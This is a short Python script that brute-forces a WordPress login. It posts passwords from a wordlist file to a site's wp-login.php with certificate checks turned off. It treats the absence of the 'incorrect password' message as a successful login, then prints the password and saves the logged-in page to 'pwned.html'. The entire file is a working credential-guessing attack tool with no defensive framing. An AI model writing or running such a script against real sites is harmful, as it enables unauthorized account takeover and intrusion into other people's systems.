import requests
import re
from creds import LOGIN, PWD
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}

with requests.Session() as s, open("passwords.txt") as f:
    count = 0
    for PWD in f:
        count += 1
        r = s.post('https://my-awesome-site.com/wp-login.php',
                   data={'log': LOGIN, 'pwd': PWD}, verify=False)
        status = re.findall(
            "The password you entered for the username .* incorrect", r.text)
        if not status:
            print("Logged in!", count, ":", PWD)
            f = open("pwned.html", "w")
            f.write(r.text)
            f.close()
            break
